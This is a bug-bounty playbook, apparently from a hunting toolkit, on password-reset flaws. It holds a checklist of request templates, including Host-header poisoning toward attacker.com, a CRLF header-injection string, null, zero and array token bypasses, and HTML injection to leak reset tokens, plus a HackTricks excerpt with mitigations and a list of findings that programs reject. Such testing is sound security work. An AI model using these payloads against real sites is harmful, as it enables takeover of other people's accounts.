# Real-World Playbook — Password Reset Flaws

**Class:** `reset-password` · **Coverage-matrix tier:** 1 · **Hunter2:** /auth-hunt · **Skill:** auth-attacks
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

[ ] a lot of ideas in this article  by **omer hesham**
```
https://medium.com/bugbountywriteup/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
```

[ ] Use Your Token on Victims Email
```
POST /reset
...
...
email=victim@gmail.com&token=$YOUR-TOKEN$

```

[ ] Host Header Injection
```
POST /reset
Host: attacker.com
...
email=victim@gmail.com
```

[ ] HTML injection in Host Header
```
POST /reset
Host: attacker">.com
...
email=victim@gmail.com
```

[ ] Leakage of Password reset in Referer Header
```
Referrer: https://website.com/reset?token=1234
```


[ ] Using Companies Email
```
While inviting users into your account/organization, you can also try inviting company emails and add a 
new field "password": "example123". or "pass": "example123" in the request. you may end up resetting a
user password

Company emails can be found on target's GitHub Repos members or you can check on http://hunter.io. some users
have a feature to set a password for invited emails, so here we can try adding a pass parameter.

If successful, we can use those credentials to login into the account, SSO integrations, support panels,
etc #BugBountyTips
```

[ ] CRLF in URL
```
with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)
```

[ ] HTML injection in Email
```
HTML injection in email via parameters, cookie, etc > inject image > leak the  token
```

[ ] Remove token
```
http://example.com/reset?eamil=victims@gmail.com&token=
```

[ ] Change it to 0000
```
http://example.com/reset?eamil=victims@gmail.com&token=0000000000
```

[ ] Use Null Value
```
http://example.com/reset?eamil=victims@gmail.com&token=Null/nil
```

[ ] try an array of old tokens
```
http://example.com/reset?eamil=victims@gmail.com&token=[oldtoken1,oldtoken2]
```

[ ] SQLi bypass
```
try sqli bypass and wildcard or, %, *
```

[ ] Request Method / Content Type
```
change request method (get, put, post etc) and/or content type (xml<>json) 
```

[ ] Response Manipulation
```
Replace bad response and replace with good one
```

[ ] Massive Token
```
http://example.com/reset?eamil=victims@gmail.com&token=1000000 long string
```

[ ] Crossdomain Token Usage
```
If a program has multiple domains using same underlying reset mechanism, reset token generated from one domain sometime 
works in another domain too.
```
[ ] Leaking Reset Token in Response Body                                                                                                                   
[ ] change 1 char at the begin/end to see if the token is evaluated                                                                                         
[ ] use unicode char jutzu to spoof email address                                                                                                           
[ ] look for race conditions                                                                                                                               
[ ] try to register the same mail with different TLD (.eu,.net etc)

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HowToHunt
### Password Reset Mindmap

### Source
* [Twitter](https://twitter.com/N008x/status/1302515523557548032/photo/1)
* [Blog](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
### Authors
* [KathanP19](https://twitter.com/KathanP19)

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Reset/Forgotten Password Bypass


#### **Password Reset Token Leak Via Referrer**

- The HTTP referer header may leak the password reset token if it's included in the URL. This can occur when a user clicks on a third-party website link after requesting a password reset.
- **Impact**: Potential account takeover if a third party receives and redeems the leaked reset token.
- **Exploitation**: To check if a password reset token is leaking in the referer header, **request a password reset** to your email address and **click the reset link** provided. **Do not change your password** immediately. Instead, **navigate to a third-party website** (like Facebook or Twitter) while **intercepting the requests using Burp Suite**. Inspect the requests to see if the **referer header contains the password reset token**, as this could expose sensitive information to third parties.<sup>[[1]](#references)</sup><sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

#### **Password Reset Poisoning**

- Attackers may manipulate the Host header during password reset requests to point the reset link to a malicious site.
- **Impact**: Leads to potential account takeover by leaking reset tokens to attackers.<sup>[[4]](#references)</sup>
- **Exploitation tips**:
  - Test not only `Host`, but also override headers such as `X-Forwarded-Host`, `Forwarded`, `X-Host`, and `X-Original-Host`. Reverse proxies and middleware sometimes build the reset URL from those values instead of from the canonical host.
  - If the reset request contains parameters such as `baseurl`, `return_to`, `redirect_uri`, `redirect_url`, `next`, or a tenant/domain selector, point them to an attacker-controlled host and inspect the email template.
  - Try the poisoning payload on the first request **and** on "resend reset link" endpoints. In several real cases only one of the two paths was vulnerable.
- **Mitigation Steps**:
  - Validate the Host header against an allow-list of permitted domains.
  - Use secure, server-side methods to generate absolute URLs.
  - **Patch**: Use `$_SERVER['SERVER_NAME']` to construct password reset URLs instead of `$_SERVER['HTTP_HOST']`.


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Host-header poisoning → reset link points to attacker → token theft → ATO
- Token leak in referrer / predictable token → ATO
- Reset without invalidating session / IDOR on userId in reset → ATO

## Hunter2 wiring
- **Run:** `/auth-hunt`
- **Skill:** `auth-attacks`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- Host-header injection alone with no proof the reset email/link actually used the injected host
- Reset token "theoretically" leaking in referrer/response — no token redeemed to take over an account
- MFA/reset-code rate-limit weakness where no code was ever actually accepted
- token=null/0000/empty "accepted" on your own account only — no victim account reset
- Session-not-invalidated-on-reset alone (it is on the never-submit list)
- Self-reset flows that never cross into another user's account

**Conditionally valid (only WITH a chain):** Host-header poisoning where the reset link points to an attacker host → token theft → ATO; token leak in referrer / predictable token redeemed → ATO; IDOR on userId in reset → ATO.
